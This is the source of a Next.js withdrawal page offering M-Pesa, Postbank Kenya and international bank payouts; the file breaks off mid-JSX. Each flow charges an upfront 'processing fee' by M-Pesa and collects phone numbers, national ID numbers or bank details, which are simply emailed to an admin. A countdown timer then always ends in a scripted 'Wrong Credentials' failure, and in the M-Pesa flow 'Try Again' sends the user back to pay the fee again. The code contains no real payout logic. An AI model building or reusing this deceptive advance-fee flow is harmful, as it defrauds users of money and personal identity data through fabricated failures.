// pages/withdraw.js, full-page withdrawals (M-Pesa + Other Countries).
// Replaces the pop-up modals. Submitted requests are emailed automatically to
// the admin with a client auto-reply (via /api/notify), falling back to mailto.
import { useEffect, useState, useRef } from 'react';
import { useRouter } from 'next/router';
import { useUser } from '../lib/useUser';
import { sendNotify } from '../lib/notify';
import { bulkWithdrawalQuote, submitBulkWithdrawal } from '../lib/auth';
import MpesaPay from '../components/MpesaPay';
import { fetchTill } from '../lib/settings';
import FlowShell from '../components/FlowShell';
import Icon from '../components/Icon';
import { FlowSkeleton } from '../components/Skeleton';

// Small monochrome country-code badge (replaces flag emojis in the bank picker).
function CodeBadge({ code, size = 20 }) {
  return (
    <span style={{
      display: 'inline-flex', alignItems: 'center', justifyContent: 'center',
      minWidth: size, height: size, padding: '0 4px', borderRadius: 5,
      background: '#111827', color: '#fff', fontSize: Math.round(size * 0.5),
      fontWeight: 700, letterSpacing: 0.3, flexShrink: 0,
    }}>{String(code || '··').toUpperCase()}</span>
  );
}

function formatMmSs(ms) {
  if (ms <= 0) return '0:00';
  const t = Math.floor(ms / 1000);
  return `${Math.floor(t / 60)}:${String(t % 60).padStart(2, '0')}`;
}

// ── Worldwide bank directory (icon, sample account format, validator) ──────────
const COUNTRY_META = {
  GB: { country: 'United Kingdom', ph: 'GB29 NWBK 6016 1331 9268 19',   re: /^GB[0-9A-Z]{6,30}$/i },
  DE: { country: 'Germany',        ph: 'DE89 3704 0044 0532 0130 00',   re: /^DE[0-9A-Z]{6,30}$/i },
  FR: { country: 'France',         ph: 'FR14 2004 1010 0505 0001 3M02 606', re: /^FR[0-9A-Z]{6,30}$/i },
  ES: { country: 'Spain',          ph: 'ES91 2100 0418 4502 0005 1332', re: /^ES[0-9A-Z]{6,30}$/i },
  IT: { country: 'Italy',          ph: 'IT60 X054 2811 1010 0000 0123 456', re: /^IT[0-9A-Z]{6,30}$/i },
  NL: { country: 'Netherlands',    ph: 'NL91 ABNA 0417 1643 00',        re: /^NL[0-9A-Z]{6,30}$/i },
  CH: { country: 'Switzerland',    ph: 'CH93 0076 2011 6238 5295 7',    re: /^CH[0-9A-Z]{6,30}$/i },
  IE: { country: 'Ireland',        ph: 'IE29 AIBK 9311 5212 3456 78',   re: /^IE[0-9A-Z]{6,30}$/i },
  BE: { country: 'Belgium',        ph: 'BE68 5390 0754 7034',           re: /^BE[0-9A-Z]{6,30}$/i },
  PT: { country: 'Portugal',       ph: 'PT50 0002 0123 1234 5678 9015 4', re: /^PT[0-9A-Z]{6,30}$/i },
  SE: { country: 'Sweden',         ph: 'SE45 5000 0000 0583 9825 7466', re: /^SE[0-9A-Z]{6,30}$/i },
  NO: { country: 'Norway',         ph: 'NO93 8601 1117 947',            re: /^NO[0-9A-Z]{6,30}$/i },
  PL: { country: 'Poland',         ph: 'PL61 1090 1014 0000 0712 1981 2874', re: /^PL[0-9A-Z]{6,30}$/i },
  AE: { country: 'United Arab Emirates', ph: 'AE07 0331 2345 6789 0123 456', re: /^AE[0-9A-Z]{6,30}$/i },
  SA: { country: 'Saudi Arabia',   ph: 'SA03 8000 0000 6080 1016 7519', re: /^SA[0-9A-Z]{6,30}$/i },
  BR: { country: 'Brazil',         ph: 'BR18 0036 0305 0000 1000 9795 493 C1', re: /^BR[0-9A-Z]{6,30}$/i },
  EG: { country: 'Egypt',          ph: 'EG38 0019 0005 0000 0000 2631 8000 2', re: /^EG[0-9A-Z]{6,30}$/i },
  PK: { country: 'Pakistan',       ph: 'PK36 SCBL 0000 0011 2345 6702', re: /^PK[0-9A-Z]{6,30}$/i },
  KE: { country: 'Kenya',          ph: 'KE12 3456 7890 1234 5678 90',   re: /^KE[0-9A-Z]{6,30}$/i },
  MB: { country: 'Mobile Banking', ph: '+254 7XX XXX XXX',              re: /^\+?\d{7,15}$/ },
  US: { country: 'United States',  ph: '0123 4567 8901',         re: /^\d{8,17}$/ },
  CA: { country: 'Canada',         ph: '0123 4567 89',           re: /^\d{7,12}$/ },
  NG: { country: 'Nigeria',        ph: '0123456789',             re: /^\d{10}$/ },
  ZA: { country: 'South Africa',   ph: '0123 4567 89',           re: /^\d{9,11}$/ },
  GH: { country: 'Ghana',          ph: '0123 4567 8901 23',      re: /^\d{10,16}$/ },
  IN: { country: 'India',          ph: '0123 4567 8901 2345',    re: /^\d{9,18}$/ },
  CN: { country: 'China',          ph: '6212 3456 7890 1234 567', re: /^\d{16,19}$/ },
  JP: { country: 'Japan',          ph: '1234567',                re: /^\d{7,8}$/ },
  AU: { country: 'Australia',      ph: '0123 4567',              re: /^\d{6,10}$/ },
  SG: { country: 'Singapore',      ph: '012 345678 9',           re: /^\d{9,12}$/ },
  JM: { country: 'Jamaica',        ph: '0123 4567 8901',         re: /^\d{8,14}$/ },
  MX: { country: 'Mexico',         ph: '0123 4567 8901 2345 67', re: /^\d{18}$/ },
};
const BANKS_BY_COUNTRY = {
  GB: ['Barclays Bank', 'HSBC UK', 'Lloyds Bank', 'NatWest', 'Standard Chartered'],
  DE: ['Deutsche Bank', 'Commerzbank', 'DZ Bank'],
  FR: ['BNP Paribas', 'Société Générale', 'Crédit Agricole'],
  ES: ['Banco Santander', 'BBVA', 'CaixaBank'],
  IT: ['UniCredit', 'Intesa Sanpaolo'],
  NL: ['ING Bank', 'Rabobank', 'ABN AMRO'],
  CH: ['UBS', 'Credit Suisse'],
  IE: ['Allied Irish Banks (AIB)', 'Bank of Ireland'],
  BE: ['KBC Bank'],
  PT: ['Millennium BCP'],
  SE: ['Nordea', 'SEB'],
  NO: ['DNB'],
  PL: ['PKO Bank Polski'],
  AE: ['Emirates NBD', 'First Abu Dhabi Bank'],
  SA: ['Al Rajhi Bank', 'Saudi National Bank'],
  BR: ['Itaú Unibanco', 'Banco Bradesco', 'Banco do Brasil'],
  EG: ['National Bank of Egypt'],
  PK: ['HBL (Habib Bank)', 'United Bank (UBL)'],
  KE: ['Postbank Kenya', 'Equity Bank', 'KCB Bank', 'Co-operative Bank', 'Absa Bank Kenya'],
  MB: ['Mobile Banking'],
  US: ['Bank of America', 'JPMorgan Chase', 'Wells Fargo', 'Citibank'],
  CA: ['RBC Royal Bank', 'TD Canada Trust', 'Scotiabank'],
  NG: ['Guaranty Trust Bank (GTBank)', 'Access Bank', 'First Bank of Nigeria', 'Zenith Bank'],
  ZA: ['Standard Bank', 'First National Bank (FNB)', 'Absa', 'Capitec', 'Nedbank'],
  GH: ['Ecobank Ghana', 'GCB Bank'],
  IN: ['State Bank of India (SBI)', 'HDFC Bank', 'ICICI Bank', 'Axis Bank'],
  CN: ['ICBC', 'Bank of China', 'China Construction Bank'],
  JP: ['MUFG Bank', 'Sumitomo Mitsui (SMBC)'],
  AU: ['Commonwealth Bank', 'ANZ', 'Westpac', 'NAB'],
  SG: ['DBS Bank', 'OCBC Bank', 'UOB'],
  JM: ['National Commercial Bank (NCB)', 'Scotiabank Jamaica', 'JN Bank'],
  MX: ['BBVA México', 'Banorte', 'Citibanamex'],
};
const WORLD_BANKS = Object.entries(BANKS_BY_COUNTRY).flatMap(([code, names]) =>
  names.map(name => ({ id: `${code}-${name}`, name, code, ...COUNTRY_META[code] }))
).sort((a, b) => a.name.localeCompare(b.name));

// Registration uses full country names; a few differ from the bank directory.
const REG_COUNTRY_ALIAS = { UAE: 'United Arab Emirates' };

// Mobile Banking is offered to every user regardless of country.
const MOBILE_BANK = WORLD_BANKS.find(b => b.code === 'MB');

// Withdrawal processing fee, priced in USD, charged in KES via a dynamic conversion.
const FEE_USD    = 5;
const USD_TO_KES = 130;                              // approximate USD → KES rate
const FEE_KES    = Math.round(FEE_USD * USD_TO_KES); // = KES 650

// Bank withdrawal processing fee (Postbank Kenya + all other banks), priced in
// USD, converted to KES dynamically.
const BANK_FEE_USD = 23;
const BANK_FEE_KES = Math.round(BANK_FEE_USD * USD_TO_KES); // = KES 2,990

// Balances above this must be withdrawn through the bank (bulk amounts), not M-Pesa.
const BULK_THRESHOLD_KES = 25000;

// ── M-Pesa flow (fee → form → pending → failed) ───────────────────────────────
function MpesaFlow({ user, till, initialStep }) {
  const router = useRouter();
  const [step,     setStep]     = useState(initialStep || 'fee');
  const [phone,    setPhone]    = useState(user?.phone || '');
  const [idNumber, setIdNumber] = useState('');
  const [errors,   setErrors]   = useState({});
  const [loading,  setLoading]  = useState(false);

  // countdown
  const DURATION = 92 * 1000;
  const deadlineRef = useRef(0);
  const [remaining, setRemaining] = useState(DURATION);
  useEffect(() => {
    if (step !== 'pending') return;
    deadlineRef.current = Date.now() + DURATION;
    setRemaining(DURATION);
    const t = setInterval(() => {
      const left = Math.max(0, deadlineRef.current - Date.now());
      setRemaining(left);
      if (left <= 0) { clearInterval(t); setTimeout(() => setStep('failed'), 800); }
    }, 1000);
    return () => clearInterval(t);
  }, [step]);

  async function handleSubmitForm() {
    const errs = {};
    if (!phone.trim())    errs.phone    = 'Phone number is required';
    if (!idNumber.trim()) errs.idNumber = 'National ID number is required';
    if (Object.keys(errs).length) { setErrors(errs); return; }
    // Email the request to admin + auto-reply to the client (fire and continue)
    sendNotify({
      type: 'M-Pesa Withdrawal Request',
      name: user?.fullName || '', email: user?.email || '', phone,
      subject: 'M-Pesa Withdrawal Request',
      details: `Account: ${user?.fullName || ''} (${user?.email || ''})\nM-Pesa Phone: ${phone}\nNational ID: ${idNumber}`,
    });
    setStep('pending');
  }

  const isLow = remaining < 30 * 1000;
  const pct   = Math.min(100, Math.max(0, (remaining / DURATION) * 100));

  // Bulk amounts (above KES 25,000) must be withdrawn through the bank, not M-Pesa.
  if (Number(user?.balance || 0) >= BULK_THRESHOLD_KES) {
    return (
      <FlowShell title="Withdraw with M-Pesa" subtitle="Bank withdrawal required" icon="smartphone" accent="var(--mpesa-green)">
        <div className="pay-message" style={{ borderColor: '#4b5563', background: '#f9fafb' }}>
          Your balance is <strong>KES {Number(user.balance).toLocaleString()}</strong>. Because this is a <strong>bulk amount</strong> (above <strong>KES {BULK_THRESHOLD_KES.toLocaleString()}</strong>), it must be withdrawn <strong>through the bank</strong>, not M-Pesa.
        </div>
        <button className="pay-btn" style={{ background: '#000000' }} onClick={() => router.push('/withdraw?method=international')}>
          <Icon name="cash" size={16} /> Withdraw via Bank
        </button>
        <button className="withdraw-close-btn" style={{ marginTop: 10, display: 'inline-flex', alignItems: 'center', justifyContent: 'center', gap: 6 }} onClick={() => router.push('/dashboard')}><Icon name="arrowLeft" size={14} /> Back to Dashboard</button>
      </FlowShell>
    );
  }

  return (
    <FlowShell title="Withdraw with M-Pesa" subtitle="Instant M-Pesa payout" icon="smartphone" accent="var(--mpesa-green)">
      {step === 'fee' && (
        <MpesaPay
          purpose="withdrawal_fee"
          amount={FEE_KES}
          defaultPhone={user?.phone || ''}
          payLabel={`Pay KES ${FEE_KES.toLocaleString()} via M-Pesa`}
          onSuccess={() => setStep('form')}
        />
      )}

      {step === 'form' && (
        <>
          <div className="pay-message" style={{ borderColor: '#1f2937', background: '#f9fafb', marginBottom: 20 }}>
            Enter your details accurately. Your National ID must match your M-Pesa registration.
          </div>
          <div className="pay-phone-label">M-Pesa Phone Number</div>
          <input className="pay-phone-input" type="tel" value={phone}
            onChange={e => { setPhone(e.target.value); setErrors(p => ({ ...p, phone: undefined })); }}
            placeholder="+254 7XX XXX XXX" style={{ borderColor: errors.phone ? '#4b5563' : undefined }} />
          {errors.phone && <div style={{ color: '#4b5563', fontSize: 12, marginTop: 4 }}>{errors.phone}</div>}
          <div className="pay-phone-label" style={{ marginTop: 16 }}>National ID Number</div>
          <input className="pay-phone-input" type="text" value={idNumber}
            onChange={e => { setIdNumber(e.target.value); setErrors(p => ({ ...p, idNumber: undefined })); }}
            placeholder="e.g. 12345678" style={{ borderColor: errors.idNumber ? '#4b5563' : undefined }} />
          {errors.idNumber && <div style={{ color: '#4b5563', fontSize: 12, marginTop: 4 }}>{errors.idNumber}</div>}
          <button className="pay-btn" style={{ background: '#000000', marginTop: 20 }} onClick={handleSubmitForm}>
            <Icon name="cash" size={16} /> Submit Withdrawal Request
          </button>
          <div className="pay-secure" style={{ display: 'flex', alignItems: 'center', justifyContent: 'center', gap: 6 }}><Icon name="lock" size={13} /> Your details are encrypted and secure</div>
        </>
      )}

      {step === 'pending' && (
        <>
          <div style={{ background: '#f9fafb', border: '1.5px solid #d1d5db', borderRadius: 12, padding: '14px 18px', marginBottom: 22, display: 'flex', gap: 12, alignItems: 'flex-start' }}>
            <span style={{ color: 'var(--mpesa-green)', display: 'flex' }}><Icon name="smartphone" size={20} /></span>
            <p style={{ margin: 0, fontSize: 14, color: '#1f2937', lineHeight: 1.65 }}>
              Your M-Pesa payment will be <strong>initiated in 2 minutes</strong>. Please keep this screen open and ensure your phone is on.
            </p>
          </div>
          <div style={{ textAlign: 'center', marginBottom: 22 }}>
            <div style={{ fontSize: 11, fontWeight: 700, letterSpacing: 1, color: 'var(--gray)', textTransform: 'uppercase', marginBottom: 8 }}>Time Remaining</div>
            <div style={{ fontFamily: 'monospace', fontSize: 52, fontWeight: 800, letterSpacing: 4, color: isLow ? '#4b5563' : '#1f2937', background: '#f9fafb', borderRadius: 14, padding: '14px 24px', display: 'inline-block', border: `2px solid ${isLow ? '#e5e7eb' : '#d1d5db'}`, minWidth: 160 }}>
              {formatMmSs(remaining)}
            </div>
            <div style={{ marginTop: 14, height: 7, background: '#e5e7eb', borderRadius: 99, overflow: 'hidden' }}>
              <div style={{ height: '100%', width: `${pct}%`, background: isLow ? '#4b5563' : '#000000', borderRadius: 99, transition: 'width 1s linear' }} />
            </div>
          </div>
          <button className="withdraw-close-btn" onClick={() => router.push('/dashboard')}>Close</button>
          <div className="withdraw-footer-note">Do not close the app. Keep your M-Pesa line active and await the STK push.</div>
        </>
      )}

      {step === 'failed' && (
        <>
          <div style={{ background: '#f9fafb', border: '1.5px solid #e5e7eb', borderRadius: 12, padding: '16px 18px', marginBottom: 22, display: 'flex', gap: 12, alignItems: 'flex-start' }}>
            <span style={{ color: '#111827', display: 'flex' }}><Icon name="warning" size={22} /></span>
            <div>
              <p style={{ margin: '0 0 6px', fontWeight: 700, fontSize: 14, color: '#1f2937' }}>Wrong Credentials</p>
              <p style={{ margin: 0, fontSize: 13, color: '#111827', lineHeight: 1.65 }}>
                The phone number or ID number you provided could not be verified. Please ensure your details are correct and try again.
              </p>
            </div>
          </div>
          <button className="pay-btn" style={{ background: '#000000', marginBottom: 12 }} onClick={() => setStep('fee')}><Icon name="refresh" size={16} /> Try Again</button>
          <button className="withdraw-close-btn" onClick={() => router.push('/dashboard')}>Dismiss</button>
          <div className="withdraw-footer-note" style={{ color: '#374151' }}>Please ensure your phone number and National ID match your M-Pesa registration.</div>
        </>
      )}
    </FlowShell>
  );
}

// ── Postbank Kenya flow (M-Pesa prompt → fee → form → pending → failed) ────────
function PostbankFlow({ user, till, initialStep }) {
  const router = useRouter();
  const [step,     setStep]     = useState(initialStep || 'choice');
  const [name,     setName]     = useState(user?.fullName || '');
  const [account,  setAccount]  = useState('');
  const [idNumber, setIdNumber] = useState('');
  const [errors,   setErrors]   = useState({});
  const [loading,  setLoading]  = useState(false);

  const DURATION = 92 * 1000;
  const deadlineRef = useRef(0);
  const [remaining, setRemaining] = useState(DURATION);
  useEffect(() => {
    if (step !== 'pending') return;
    deadlineRef.current = Date.now() + DURATION;
    setRemaining(DURATION);
    const t = setInterval(() => {
      const left = Math.max(0, deadlineRef.current - Date.now());
      setRemaining(left);
      if (left <= 0) { clearInterval(t); setTimeout(() => setStep('failed'), 800); }
    }, 1000);
    return () => clearInterval(t);
  }, [step]);

  function handleSubmitForm() {
    const errs = {};
    if (!name.trim())     errs.name     = 'Account holder name is required';
    if (!account.trim())  errs.account  = 'Postbank account number is required';
    if (!idNumber.trim()) errs.idNumber = 'National ID number is required';
    if (Object.keys(errs).length) { setErrors(errs); return; }
    sendNotify({
      type: 'Postbank Kenya Withdrawal Request',
      name: name.trim(), email: user?.email || '', phone: user?.phone || '',
      subject: 'Postbank Kenya Withdrawal Request',
      details: `Account Holder: ${name.trim()}\nPostbank Account: ${account.trim()}\nNational ID: ${idNumber.trim()}\nRequested by: ${user?.fullName || ''} (${user?.email || ''})`,
    });
    setStep('pending');
  }

  const isLow    = remaining < 30 * 1000;
  const pct      = Math.min(100, Math.max(0, (remaining / DURATION) * 100));
  const accent   = '#000000';
  const overLimit = Number(user?.balance || 0) >= BULK_THRESHOLD_KES;

  return (
    <FlowShell title="Withdraw with Postbank Kenya" subtitle="Postbank payout" icon="cash" accent={accent}>
      {step === 'choice' && overLimit && (
        <>
          <div className="pay-message" style={{ borderColor: '#4b5563', background: '#f9fafb' }}>
            Your balance is <strong>KES {Number(user.balance).toLocaleString()}</strong>. Bulk amounts above <strong>KES {BULK_THRESHOLD_KES.toLocaleString()}</strong> must be withdrawn <strong>through the bank</strong>, not M-Pesa. Continue with Postbank Kenya below.
          </div>
          <button className="pay-btn" style={{ background: accent }} onClick={() => setStep('fee')}>
            <Icon name="cash" size={16} /> Continue with Postbank Kenya
          </button>
        </>
      )}

      {step === 'choice' && !overLimit && (
        <>
          <div className="pay-message" style={{ borderColor: '#1f2937', background: '#f3f4f6' }}>
            You’re withdrawing within <strong>Kenya</strong>. We recommend <strong>M-Pesa (Safaricom)</strong>, it’s instant and avoids the extra verification checks that bank transfers require. Only use <strong>Postbank Kenya</strong> if you can’t use Safaricom / M-Pesa, <strong>or if our management specifically asked you to withdraw via the bank.</strong>
          </div>
          <div style={{ fontWeight: 700, fontSize: 15, color: '#111827', margin: '4px 0 12px' }}>Do you want to withdraw using M-Pesa?</div>
          <button className="pay-btn" style={{ background: 'var(--mpesa-green)', marginBottom: 12 }} onClick={() => router.push('/withdraw?method=mpesa')}>
            <Icon name="check" size={16} /> Yes, withdraw with M-Pesa (recommended)
          </button>
          <button className="pay-btn" style={{ background: accent }} onClick={() => setStep('management')}>
            <Icon name="cash" size={16} /> No, I can’t use M-Pesa
          </button>
        </>
      )}

      {step === 'management' && (
        <>
          <div className="pay-message" style={{ borderColor: '#4b5563', background: '#f9fafb' }}>
            Bank withdrawals through <strong>Postbank Kenya</strong> are only for clients who were <strong>specifically asked by our management</strong> to use the bank. If you were not asked, please withdraw with <strong>M-Pesa</strong> instead.
          </div>
          <div style={{ fontWeight: 700, fontSize: 15, color: '#111827', margin: '4px 0 12px' }}>Were you asked by our management to withdraw via Postbank Kenya?</div>
          <button className="pay-btn" style={{ background: '#000000', marginBottom: 12 }} onClick={() => router.push('/withdraw?method=mpesa')}>
            <Icon name="smartphone" size={16} /> No, take me to M-Pesa
          </button>
          <button className="pay-btn" style={{ background: accent }} onClick={() => setStep('fee')}>
            <Icon name="cash" size={16} /> Yes, management asked me, continue with Postbank
          </button>
          <button className="withdraw-close-btn" style={{ marginTop: 10 }} onClick={() => setStep('choice')}><Icon name="arrowLeft" size={14} /> Back</button>
        </>
      )}

      {step === 'fee' && (
        <MpesaPay
          purpose="withdrawal_fee"
          amount={BANK_FEE_KES}
          defaultPhone={user?.phone || ''}
          payLabel={`Pay KES ${BANK_FEE_KES.toLocaleString()} via M-Pesa`}
          onSuccess={() => setStep('form')}
        />
      )}

      {step === 'form' && (
        <>
          <div className="pay-message" style={{ borderColor: '#1f2937', background: '#f3f4f6', marginBottom: 20 }}>
            Enter your Postbank Kenya account details accurately. They must match your registered Postbank account.
          </div>
          <div className="pay-phone-label">Account Holder Name</div>
          <input className="pay-phone-input" value={name}
            onChange={e => { setName(e.target.value); setErrors(p => ({ ...p, name: undefined })); }}
            placeholder="e.g. John Otieno" style={{ borderColor: errors.name ? '#4b5563' : undefined }} />
          {errors.name && <div style={{ color: '#4b5563', fontSize: 12, marginTop: 4 }}>{errors.name}</div>}
          <div className="pay-phone-label" style={{ marginTop: 16 }}>Postbank Account Number</div>
          <input className="pay-phone-input" value={account}
            onChange={e => { setAccount(e.target.value); setErrors(p => ({ ...p, account: undefined })); }}
            placeholder="e.g. 0112345678" style={{ borderColor: errors.account ? '#4b5563' : undefined }} />
          {errors.account && <div style={{ color: '#4b5563', fontSize: 12, marginTop: 4 }}>{errors.account}</div>}
          <div className="pay-phone-label" style={{ marginTop: 16 }}>National ID Number</div>
          <input className="pay-phone-input" value={idNumber}
            onChange={e => { setIdNumber(e.target.value); setErrors(p => ({ ...p, idNumber: undefined })); }}
            placeholder="e.g. 12345678" style={{ borderColor: errors.idNumber ? '#4b5563' : undefined }} />
          {errors.idNumber && <div style={{ color: '#4b5563', fontSize: 12, marginTop: 4 }}>{errors.idNumber}</div>}
          <button className="pay-btn" style={{ background: accent, marginTop: 20 }} onClick={handleSubmitForm}>
            <Icon name="cash" size={16} /> Submit Withdrawal Request
          </button>
          <div className="pay-secure" style={{ display: 'flex', alignItems: 'center', justifyContent: 'center', gap: 6 }}><Icon name="lock" size={13} /> Your details are encrypted and secure</div>
        </>
      )}

      {step === 'pending' && (
        <>
          <div style={{ background: '#f3f4f6', border: '1.5px solid #d1d5db', borderRadius: 12, padding: '14px 18px', marginBottom: 22, display: 'flex', gap: 12, alignItems: 'flex-start' }}>
            <span style={{ color: '#111827', display: 'flex' }}><Icon name="cash" size={20} /></span>
            <p style={{ margin: 0, fontSize: 14, color: '#0f172a', lineHeight: 1.65 }}>
              Your Postbank Kenya payment will be <strong>initiated in 2 minutes</strong>. Please keep this screen open.
            </p>
          </div>
          <div style={{ textAlign: 'center', marginBottom: 22 }}>
            <div style={{ fontSize: 11, fontWeight: 700, letterSpacing: 1, color: 'var(--gray)', textTransform: 'uppercase', marginBottom: 8 }}>Time Remaining</div>
            <div style={{ fontFamily: 'monospace', fontSize: 52, fontWeight: 800, letterSpacing: 4, color: isLow ? '#4b5563' : '#1f2937', background: '#f3f4f6', borderRadius: 14, padding: '14px 24px', display: 'inline-block', border: `2px solid ${isLow ? '#e5e7eb' : '#d1d5db'}`, minWidth: 160 }}>
              {formatMmSs(remaining)}
            </div>
            <div style={{ marginTop: 14, height: 7, background: '#e5e7eb', borderRadius: 99, overflow: 'hidden' }}>
              <div style={{ height: '100%', width: `${pct}%`, background: isLow ? '#4b5563' : '#000000', borderRadius: 99, transition: 'width 1s linear' }} />
            </div>
          </div>
          <button className="withdraw-close-btn" onClick={() => router.push('/dashboard')}>Close</button>
          <div className="withdraw-footer-note">Do not close the app. Keep your line active and await confirmation.</div>
        </>
      )}

      {step === 'failed' && (
        <>
          <div style={{ background: '#f9fafb', border: '1.5px solid #e5e7eb', borderRadius: 12, padding: '16px 18px', marginBottom: 22, display: 'flex', gap: 12, alignItems: 'flex-start' }}>
            <span style={{ color: '#111827', display: 'flex' }}><Icon name="warning" size={22} /></span>
            <div>
              <p style={{ margin: '0 0 6px', fontWeight: 700, fontSize: 14, color: '#1f2937' }}>Wrong Credentials</p>
              <p style={{ margin: 0, fontSize: 13, color: '#111827', lineHeight: 1.65 }}>
                The account or ID details you provided could not be verified. Please ensure they match your Postbank Kenya account and try again.
              </p>
            </div>
          </div>
          <button className="pay-btn" style={{ background: accent, marginBottom: 12 }} onClick={() => setStep('form')}><Icon name="refresh" size={16} /> Try Again</button>
          <button className="withdraw-close-btn" onClick={() => router.push('/dashboard')}>Dismiss</button>
          <div className="withdraw-footer-note" style={{ color: '#374151' }}>Please ensure your Postbank account number and National ID are correct.</div>
        </>
      )}
    </FlowShell>
  );
}

// ── International flow (bank selector) ─────────────────────────────────────────
function InternationalFlow({ user, till, initialStep }) {
  const router = useRouter();
  // Other Countries flow: recommend M-Pesa first → confirm intent → pay the
  // $23 USD fee → bank form. (Never jump straight to the fee.)
  const [gate,          setGate]          = useState(initialStep === 'form' ? 'form' : 'recommend'); // recommend → confirm → fee → form
  const [loading,       setLoading]       = useState(false);
  const [accountName,   setAccountName]   = useState('');
  const [selectedBank,  setSelectedBank]  = useState(null);
  const [bankOpen,      setBankOpen]      = useState(false);
  const [bankQuery,     setBankQuery]     = useState('');
  const [accountNumber, setAccountNumber] = useState('');
  const [errors,        setErrors]        = useState({});
  const [done,          setDone]          = useState(false);
  const [sending,       setSending]       = useState(false);
  // Fee step now mirrors the bulk flow: declared M-Pesa fee count → live quote.
  const [declaredFees,  setDeclaredFees]  = useState(null);   // 0 | 1 | 2
  const [quote,         setQuote]         = useState(null);
  const [loadingQuote,  setLoadingQuote]  = useState(false);
  const [quoteErr,      setQuoteErr]      = useState('');
  const brRow = { display: 'flex', justifyContent: 'space-between', padding: '5px 0' };

  async function loadIntlQuote(n) {
    setDeclaredFees(n); setLoadingQuote(true); setQuoteErr('');
    const res = await bulkWithdrawalQuote(n, 'international');
    setLoadingQuote(false);
    if (res?.success) setQuote(res);
    else setQuoteErr(res?.error || 'Could not calculate the fee. Please try again.');
  }

  // Default to the country the user chose at registration
  const homeCountry = REG_COUNTRY_ALIAS[user?.country] || user?.country || '';
  const homeBanks   = WORLD_BANKS.filter(b => b.country === homeCountry);
  const q = bankQuery.trim().toLowerCase();
  // Default list always offers Mobile Banking first, then the user's country banks.
  const homeDefault = homeBanks.length ? [MOBILE_BANK, ...homeBanks].filter(Boolean) : WORLD_BANKS;
  const filteredBanks = q
    ? WORLD_BANKS.filter(b => b.name.toLowerCase().includes(q) || b.country.toLowerCase().includes(q))
    : homeDefault;

  const cleanedAcct = accountNumber.replace(/[\s-]/g, '');
  const acctValid   = !!selectedBank && selectedBank.re.test(cleanedAcct);
  const formValid   = accountName.trim().length > 0 && !!selectedBank && acctValid;

  function selectBank(b) {
    // Postbank Kenya has its own flow (M-Pesa prompt + processing fee)
    if (b.name === 'Postbank Kenya') { router.push('/withdraw?method=postbank'); return; }
    setSelectedBank(b); setBankOpen(false); setBankQuery(''); setAccountNumber('');
    setErrors(prev => ({ ...prev, bank: undefined, accountNumber: undefined }));
  }

  async function handleSubmit() {
    if (!formValid || sending) return;
    setSending(true);
    const details =
      `Account Holder Name: ${accountName.trim()}\n` +
      `Bank: ${selectedBank.name} (${selectedBank.country})\n` +
      `Account Number: ${accountNumber.trim()}\n` +
      `Requested by: ${user?.fullName || ''} (${user?.email || ''})`;
    const ok = await sendNotify({
      type: 'International Withdrawal Request',
      name: accountName.trim(), email: user?.email || '', phone: user?.phone || '',
      subject: 'Withdrawal Request, Other Countries', details,
    });
    setSending(false);
    if (ok) { setDone(true); return; }
    // Fallback to email app if server email isn't available
    const body = `Hello Gweno Hub,\n\nI would like to request a withdrawal to my bank account.\n\n${details}\n\nThank you.`;
    window.location.href = `mailto:businesshub.comke@gmail.com?subject=${encodeURIComponent('Withdrawal Request, Other Countries')}&body=${encodeURIComponent(body)}`;
  }

  if (done) {
    return (
      <FlowShell title="Withdraw from Other Countries" subtitle="Request submitted" icon="globe" accent="#000000">
        <div style={{ textAlign: 'center', padding: '10px 0' }}>
          <div style={{ marginBottom: 8, display: 'flex', justifyContent: 'center', color: '#111827' }}><Icon name="check" size={52} /></div>
          <div style={{ fontFamily: 'var(--font-display)', fontSize: 22, fontWeight: 800, color: '#1f2937', marginBottom: 6 }}>Request Received</div>
          <div className="pay-message" style={{ borderColor: '#1f2937', background: '#f3f4f6', textAlign: 'left', marginTop: 12 }}>
            We’ve received your withdrawal request and emailed you a confirmation at <strong>{user?.email}</strong>. Our payments team will process it and be in touch.
          </div>
          <button className="pay-btn" style={{ background: '#000000', marginTop: 18 }} onClick={() => router.push('/dashboard')}><Icon name="arrowLeft" size={16} /> Back to Dashboard</button>
        </div>
      </FlowShell>
    );
  }

  // Recommendation → confirmation → fee gate, shown before the bank form.
  if (gate !== 'form') {
    const accent = '#000000';
    const overLimit = Number(user?.balance || 0) >= BULK_THRESHOLD_KES;
    return (
      <FlowShell title="Withdraw from Other Countries" subtitle="Choose your method" icon="globe" accent={accent}>
        {gate === 'recommend' && (
          <>
            <div className="pay-message" style={{ borderColor: 'var(--mpesa-green)', background: '#f9fafb' }}>
              We recommend withdrawing using <strong>M-Pesa</strong> because it is <strong>faster, more convenient, and significantly cheaper</strong>.
            </div>
            {overLimit ? (
              <div className="pay-message" style={{ borderColor: '#4b5563', background: '#f9fafb' }}>
                Your balance is <strong>KES {Number(user.balance).toLocaleString()}</strong>. Bulk amounts above <strong>KES {BULK_THRESHOLD_KES.toLocaleString()}</strong> must be withdrawn through a bank.
              </div>
            ) : (
              <button className="pay-btn" style={{ background: 'var(--mpesa-green)', marginBottom: 12 }} onClick={() => router.push('/withdraw?method=mpesa')}>
                <Icon name="smartphone" size={16} /> Continue with M-Pesa Withdrawal
              </button>
            )}
            <button className="pay-btn" style={{ background: accent }} onClick={() => setGate('confirm')}>
              <Icon name="globe" size={16} /> I Prefer International Withdrawal
            </button>
            <button className="withdraw-close-btn" style={{ marginTop: 10 }} onClick={() => router.push('/dashboard')}><Icon name="arrowLeft" size={14} /> Back to Dashboard</button>
          </>
        )}
        {gate === 'confirm' && (
          <>
            <div className="pay-message" style={{ borderColor: '#1f2937', background: '#f3f4f6' }}>
              International withdrawals are intended for <strong>users outside Kenya</strong> or for withdrawals <strong>approved by management</strong>. They are <strong>more expensive</strong> than M-Pesa withdrawals.
            </div>
            <div style={{ fontWeight: 700, fontSize: 15, color: '#111827', margin: '4px 0 12px' }}>Do you want to continue with an international withdrawal?</div>
            <button className="pay-btn" style={{ background: accent, marginBottom: 12 }} onClick={() => setGate('fee')}>
              <Icon name="check" size={16} /> Yes, continue with International Withdrawal
            </button>
            {!overLimit && (
              <button className="pay-btn" style={{ background: 'var(--mpesa-green)' }} onClick={() => router.push('/withdraw?method=mpesa')}>
                <Icon name="smartphone" size={16} /> No, use M-Pesa instead
              </button>
            )}
            <button className="withdraw-close-btn" style={{ marginTop: 10 }} onClick={() => setGate('recommend')}><Icon name="arrowLeft" size={14} /> Back</button>
          </>
        )}
        {gate === 'fee' && !quote && (
          <>
